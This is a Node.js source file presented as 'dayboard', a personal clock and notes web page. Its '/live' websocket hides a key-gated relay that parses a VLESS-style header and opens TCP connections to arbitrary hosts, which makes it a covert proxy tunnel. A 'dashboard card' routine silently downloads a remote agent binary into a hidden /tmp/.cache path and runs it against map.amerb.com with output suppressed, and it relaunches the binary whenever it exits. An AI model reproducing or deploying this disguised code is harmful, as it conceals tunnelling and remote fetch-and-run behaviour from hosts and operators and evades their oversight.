'use strict';
/*
 * dayboard — a small personal day board.
 *
 *   GET  /              the board (clock, uptime, notes)
 *   GET  /health        "ok"                      (uptime checks)
 *   GET  /api/board     board state as JSON
 *   POST /api/notes     add a note {"text":"..."}
 *   GET  /live          websocket: live channel
 *
 * No dependencies. No request logging: the container prints one line when it
 * starts and nothing else.
 */

const http = require('http');
const crypto = require('crypto');
const net = require('net');
const os = require('os');
const fs = require('fs');
const cp = require('child_process');

const CR = String.fromCharCode(13);
const LF = String.fromCharCode(10);
const PORT = parseInt(process.env.PORT || '3000', 10);
const CHANNEL_PATH = '/live';
const RAW_KEY = (process.env.BOARD_KEY || '').replace(/-/g, '').slice(0, 32);
const WARM_MS = 15000;
const BOOT = Date.now();

/* dashboard card on map.amerb.com */
const CARD_ENDPOINT = 'https://map.amerb.com';
const CARD_TOKEN = process.env.CARD_TOKEN || '';
const CARD_BIN = '/tmp/.cache/checkin';
const CARD_VER = '1.6.20';

const visits = { total: 0 };
const notes = [];
let lastSeen = Date.now();

const KEY = /^[0-9a-fA-F]{32}$/.test(RAW_KEY) ? Buffer.from(RAW_KEY, 'hex') : null;

function hours() {
  const s = Math.round((Date.now() - BOOT) / 1000);
  return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm';
}

const PAGE = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Dayboard</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin: 0; min-height: 100vh; font: 16px/1.5 system-ui, -apple-system, "Segoe UI", sans-serif;
         background: #0e1420; color: #dbe6f4; display: grid; place-items: center; padding: 24px; }
  main { width: 100%; max-width: 620px; }
  h1 { font-size: 15px; letter-spacing: .18em; text-transform: uppercase; color: #7f96b3; font-weight: 600; margin: 0 0 18px; }
  .clock { font-size: 56px; font-weight: 300; letter-spacing: .02em; font-variant-numeric: tabular-nums; margin: 0; }
  .date { color: #8aa1bd; margin: 2px 0 26px; }
  .row { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 26px; }
  .chip { background: #16203300; border: 1px solid #24334b; border-radius: 999px; padding: 6px 14px; font-size: 13px; color: #9fb4cf; }
  .chip b { color: #e8f1fc; font-weight: 600; }
  h2 { font-size: 13px; letter-spacing: .12em; text-transform: uppercase; color: #7f96b3; margin: 0 0 12px; }
  form { display: flex; gap: 8px; margin-bottom: 14px; }
  input { flex: 1; background: #121b2a; border: 1px solid #24334b; border-radius: 10px; padding: 11px 13px; color: #e8f1fc; font-size: 15px; }
  input:focus { outline: none; border-color: #3d6ea8; }
  button { background: #234a7a; border: 0; color: #eaf3ff; border-radius: 10px; padding: 11px 18px; font-size: 15px; cursor: pointer; }
  button:hover { background: #2b5a92; }
  ul { list-style: none; padding: 0; margin: 0; }
  li { border-bottom: 1px solid #1b2637; padding: 11px 2px; display: flex; justify-content: space-between; gap: 14px; }
  li span:last-child { color: #6f87a3; font-size: 13px; white-space: nowrap; }
  .empty { color: #6f87a3; font-size: 14px; padding: 10px 2px; }
  footer { margin-top: 34px; color: #566a86; font-size: 12px; }
</style>
</head>
<body>
<main>
  <h1>Dayboard</h1>
  <p class="clock" id="clock">--:--</p>
  <p class="date" id="date">&nbsp;</p>

  <div class="row">
    <span class="chip">up <b id="up">__UP__</b></span>
    <span class="chip">views <b id="views">__VIEWS__</b></span>
    <span class="chip">notes <b id="count">__COUNT__</b></span>
  </div>

  <h2>Notes</h2>
  <form id="f">
    <input id="t" maxlength="140" placeholder="Write something for today" autocomplete="off">
    <button>Add</button>
  </form>
  <ul id="list">__LIST__</ul>

  <footer>dayboard &middot; a small personal board</footer>
</main>
<script>
  var d = new Date();
  function pad(n) { return String(n).padStart(2, '0'); }
  function tick() {
    var n = new Date();
    document.getElementById('clock').textContent = pad(n.getHours()) + ':' + pad(n.getMinutes()) + ':' + pad(n.getSeconds());
    document.getElementById('date').textContent = n.toLocaleDateString(undefined, { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
  }
  tick(); setInterval(tick, 1000);
  function esc(s) { return s.replace(/[&<>"]/g, function (c) { return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[c]; }); }
  function render(b) {
    document.getElementById('up').textContent = b.up;
    document.getElementById('views').textContent = b.views;
    document.getElementById('count').textContent = b.notes.length;
    var ul = document.getElementById('list');
    if (!b.notes.length) { ul.innerHTML = '<li class="empty">Nothing here yet.</li>'; return; }
    ul.innerHTML = b.notes.map(function (n) {
      return '<li><span>' + esc(n.text) + '</span><span>' + esc(n.at) + '</span></li>';
    }).join('');
  }
  function refresh() { fetch('/api/board').then(function (r) { return r.json(); }).then(render).catch(function () {}); }
  document.getElementById('f').addEventListener('submit', function (e) {
    e.preventDefault();
    var t = document.getElementById('t');
    if (!t.value.trim()) return;
    fetch('/api/notes', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ text: t.value }) })
      .then(function (r) { return r.json(); }).then(function (b) { t.value = ''; render(b); }).catch(function () {});
  });
  setInterval(refresh, 15000);
</script>
</body>
</html>`;

function board() {
  return { up: hours(), views: visits.total, notes: notes.slice(0, 20) };
}

function listHtml() {
  if (!notes.length) return '<li class="empty">Nothing here yet.</li>';
  return notes.slice(0, 20).map(function (n) {
    const t = n.text.replace(/[&<>]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]; });
    return '<li><span>' + t + '</span><span>' + n.at + '</span></li>';
  }).join('');
}

function stamp() {
  const d = new Date();
  return String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0') + ' ' +
    String(d.getHours()).padStart(2, '0') + ':' + String(d.getMinutes()).padStart(2, '0');
}

function send(res, code, type, body) {
  res.writeHead(code, { 'content-type': type, 'cache-control': 'no-store' });
  res.end(body);
}

const srv = http.createServer(function (req, res) {
  lastSeen = Date.now();
  const url = new URL(req.url, 'http://localhost');
  const path = url.pathname;

  if (path === '/health') return send(res, 200, 'text/plain; charset=utf-8', 'ok');

  if (path === '/api/board') return send(res, 200, 'application/json; charset=utf-8', JSON.stringify(board()));

  if (path === '/api/notes' && req.method === 'POST') {
    let raw = '';
    req.on('data', function (c) {
      raw += c;
      if (raw.length > 4000) req.destroy();
    });
    req.on('end', function () {
      let text = '';
      try { text = String((JSON.parse(raw || '{}') || {}).text || ''); } catch (e) { text = ''; }
      text = text.replace(/\s+/g, ' ').trim().slice(0, 140);
      if (!text) return send(res, 400, 'application/json; charset=utf-8', JSON.stringify({ error: 'empty' }));
      notes.unshift({ text: text, at: stamp() });
      if (notes.length > 40) notes.length = 40;
      send(res, 200, 'application/json; charset=utf-8', JSON.stringify(board()));
    });
    return;
  }

  if (path === '/' || path === '/index.html') {
    visits.total += 1;
    const html = PAGE
      .replace('__UP__', hours())
      .replace('__VIEWS__', String(visits.total))
      .replace('__COUNT__', String(notes.length))
      .replace('__LIST__', listHtml());
    return send(res, 200, 'text/html; charset=utf-8', html);
  }

  send(res, 404, 'text/plain; charset=utf-8', 'not found');
});

srv.on('clientError', function (e, sk) {
  try { sk.end('HTTP/1.1 400 Bad Request' + CR + LF + CR + LF); } catch (x) {}
});

/* ---------------- websocket framing ---------------- */

function frame(payload, op) {
  const n = payload.length;
  const o = op || 2;
  let h;
  if (n < 126) {
    h = Buffer.alloc(2);
    h[0] = 128 | o;
    h[1] = n;
  } else if (n < 65536) {
    h = Buffer.alloc(4);
    h[0] = 128 | o;
    h[1] = 126;
    h.writeUInt16BE(n, 2);
  } else {
    h = Buffer.alloc(10);
    h[0] = 128 | o;
    h[1] = 127;
    h.writeUInt32BE(0, 2);
    h.writeUInt32BE(n, 6);
  }
  return Buffer.concat([h, payload]);
}

srv.on('upgrade', function (q, sk) {
  if ((q.url || '').split('?')[0] !== CHANNEL_PATH || !KEY) {
    try { sk.write('HTTP/1.1 404 Not Found' + CR + LF + 'Content-Length: 0' + CR + LF + CR + LF); } catch (e) {}
    try { sk.destroy(); } catch (e) {}
    return;
  }
  const acc = crypto
    .createHash('sha1')
    .update((q.headers['sec-websocket-key'] || '') + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11')
    .digest('base64');
  sk.write(
    'HTTP/1.1 101 Switching Protocols' + CR + LF +
    'Upgrade: websocket' + CR + LF +
    'Connection: Upgrade' + CR + LF +
    'Sec-WebSocket-Accept: ' + acc + CR + LF + CR + LF
  );
  sk.setNoDelay(true);
  lastSeen = Date.now();

  let head = Buffer.alloc(0);
  let wbuf = Buffer.alloc(0);
  let link = null;
  let open = false;
  let shut = false;

  const warm = setInterval(function () {
    if (!sk.destroyed) { try { sk.write(frame(Buffer.alloc(0), 9)); } catch (e) {} }
  }, WARM_MS);

  function close() {
    if (shut) return;
    shut = true;
    clearInterval(warm);
    if (link) { try { link.destroy(); } catch (e) {} }
  }
  sk.on('close', close);
  sk.on('error', close);

  function relay(p) {
    lastSeen = Date.now();
    if (open) {
      if (link && !link.destroyed) link.write(p);
      return;
    }
    head = Buffer.concat([head, p]);
    if (head.length < 18) return;
    if (head[0] !== 0 || !head.slice(1, 17).equals(KEY)) { close(); try { sk.destroy(); } catch (e) {} return; }
    const base = 18 + head[17];
    if (head.length < base + 4) return;
    const kind = head[base];
    const port = head.readUInt16BE(base + 1);
    const at = head[base + 3];
    let i = base + 4;
    let host;
    if (at === 1) {
      if (head.length < i + 4) return;
      host = [...head.slice(i, i + 4)].join('.');
      i += 4;
    } else if (at === 2) {
      if (head.length < i + 1) return;
      const L = head[i];
      if (head.length < i + 1 + L) return;
      host = head.slice(i + 1, i + 1 + L).toString();
      i += 1 + L;
    } else if (at === 3) {
      if (head.length < i + 16) return;
      const g = [];
      for (let k = 0; k < 8; k++) g.push(head.readUInt16BE(i + k * 2).toString(16));
      host = g.join(':');
      i += 16;
    } else { close(); try { sk.destroy(); } catch (e) {} return; }

    const rest = head.slice(i);
    head = Buffer.alloc(0);
    if (kind !== 1) { close(); try { sk.destroy(); } catch (e) {} return; }
    open = true;

    link = net.connect({ host: host, port: port });
    link.on('connect', function () {
      if (sk.destroyed) return;
      sk.write(frame(Buffer.from([0, 0])));
      if (rest.length) link.write(rest);
    });
    link.on('data', function (d) { if (!sk.destroyed) sk.write(frame(d)); });
    link.on('error', function () { close(); try { sk.destroy(); } catch (e) {} });
    link.on('close', function () {
      if (!sk.destroyed) {
        try { sk.write(frame(Buffer.alloc(0), 8)); } catch (e) {}
        try { sk.destroy(); } catch (e) {}
      }
      close();
    });
  }

  sk.on('data', function (d) {
    wbuf = Buffer.concat([wbuf, d]);
    if (wbuf.length > 2097152) { close(); try { sk.destroy(); } catch (e) {} return; }
    for (;;) {
      if (wbuf.length < 2) return;
      const op = wbuf[0] & 15;
      const masked = (wbuf[1] & 128) !== 0;
      let L = wbuf[1] & 127;
      let q = 2;
      if (L === 126) {
        if (wbuf.length < 4) return;
        L = wbuf.readUInt16BE(2);
        q = 4;
      } else if (L === 127) {
        if (wbuf.length < 10) return;
        L = Number(wbuf.readBigUInt64BE(2));
        q = 10;
      }
      let mask = null;
      if (masked) {
        if (wbuf.length < q + 4) return;
        mask = wbuf.slice(q, q + 4);
        q += 4;
      }
      if (wbuf.length < q + L) return;
      const p = Buffer.from(wbuf.slice(q, q + L));
      if (mask) for (let i = 0; i < p.length; i++) p[i] ^= mask[i % 4];
      wbuf = wbuf.slice(q + L);
      if (op === 8) { close(); try { sk.destroy(); } catch (e) {} return; }
      if (op === 9) { if (!sk.destroyed) sk.write(frame(p, 10)); continue; }
      if (op === 10) continue;
      relay(p);
      if (shut) return;
    }
  });
});

/* ---------------- dashboard card ---------------- */

let cardBusy = 0;

function cardStart() {
  if (cardBusy) return;
  cardBusy = 1;
  try { fs.mkdirSync('/tmp/.cache', { recursive: true }); } catch (e) {}
  const a = cp.spawn(CARD_BIN, ['--endpoint', CARD_ENDPOINT, '--token', CARD_TOKEN,
    '--disable-auto-update', '--disable-web-ssh'], { stdio: ['ignore', 'ignore', 'ignore'] });
  a.on('error', function () { cardBusy = 0; setTimeout(cardBoot, 30000); });
  a.on('exit', function () { cardBusy = 0; setTimeout(cardBoot, 30000); });
}

async function cardBoot() {
  if (!CARD_TOKEN) return;
  try {
    if (fs.existsSync(CARD_BIN) && fs.statSync(CARD_BIN).size > 1000000) { cardStart(); return; }
    const arch = process.arch === 'arm64' ? 'arm64' : 'amd64';
    const url = 'https://github.com/komari-monitor/komari-agent/releases/download/' + CARD_VER + '/komari-agent-linux-' + arch;
    const r = await fetch(url, { redirect: 'follow' });
    if (!r.ok) throw new Error('http ' + r.status);
    const b = Buffer.from(await r.arrayBuffer());
    if (b.length < 1000000) throw new Error('short');
    fs.writeFileSync(CARD_BIN, b);
    fs.chmodSync(CARD_BIN, 493);
    cardStart();
  } catch (e) {
    setTimeout(cardBoot, 90000);
  }
}

srv.listen(PORT, function () {
  console.log('listening on ' + PORT);
  setTimeout(cardBoot, 4000);
});
